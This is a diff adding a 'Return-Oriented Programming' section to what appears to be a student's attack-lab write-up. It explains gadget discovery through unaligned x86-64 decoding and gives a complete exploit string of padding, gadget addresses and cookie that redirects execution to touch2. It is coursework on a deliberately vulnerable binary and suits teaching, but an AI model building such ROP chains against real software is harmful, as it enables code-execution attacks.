@@ -181,3 +181,54 @@ fa 18 40 00 c3 00 00 00
 00 00 00 00 00 00 00 00
 35 39 62 39 39 37 66 61
 ```
+
+## Part 2 Return-Oriented Programming
+
+ROP is an exploitation technique that builds attack payloads by chaining existing, `ret`-terminated instruction snippets (gadgets). Gadgets are located via byte-aligned scanning of executable memory. The attacker controls the stack to sequence these gadgets, with each `ret` instruction transferring control to the next gadget in the chain.
+
+In the assignment example, the byte sequence `48 89 c7 c3` is extracted from the instruction `c7 07 d4 48 89 c7    movl   $0xc78948d4, (%rdi)`. When execution begins at the `48` byte, this sequence is interpreted as the instruction `movq %rax, %rdi`. This is possible because x86-64 instructions are variable-length and lack alignment boundaries, allowing the same byte stream to be decoded as different instructions depending on the starting offset.
+
+### Level 2
+<img src="asm.png" width="60%" height="60%">
+
+```assembly
+movq $0x59b997fa, %rdi
+pushq $0x4017ec
+retq
+```
+
+This is the asnwer in Part 2. The straightforward approach would be to find a gadget that directly sets the value `0x59b997fa` into the `%rdi` register. However, searching through the gadget farm reveals that no such gadget exists in the available code.
+
+Since a direct movq instruction with the immediate value is unavailable, an indirect approach is employed:
+
+1. Place the value on the stack
+
+    The cookie value `0x59b997fa` is included in the exploit string.
+
+2. Use `popq %rax`
+
+    Extract the value from the stack into a register.
+
+3. Transfer to `%rdi`
+
+    Move the value from `%rax` to `%rdi` using `movq %rax, %rdi`.
+
+4. Return to `touch2`
+
+The `popq %rax` instruction corresponds to the byte `58`. Examining the disassembled code reveals the following memory content `4019a7: 8d 87 51 73 58 90`. This sequence contains `58` followed by `90` (a `nop` instruction), forming a valid `popq %rax; nop` gadget. The execution should start at address `0x4019ab` to align the instruction boundaries correctly.
+
+The `movq %rax, %rdi` instruction corresponds to the bytes `48 89 c7`. The disassembly shows `4019a0: 8d 87 48 89 c7 c3`. Starting execution at address `0x4019a3` causes the sequence `48 89 c7 c3` to be interpreted as `movq %rax, %rdi; ret`.
+
+The complete exploit string is structured as follows:
+
+```
+00 00 00 00 00 00 00 00 # Padding for the buffer (40 bytes)
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00 # Address of popq %rax gadget (0x4019ab)
+fa 97 b9 59 00 00 00 00 # Cookie value to be popped into %rax
+a3 19 40 00 00 00 00 00 # Address of movq %rax, %rdi gadget (0x4019a3)
+ec 17 40 00 00 00 00 00 # Address of touch2 function (0x4017ec)
+```
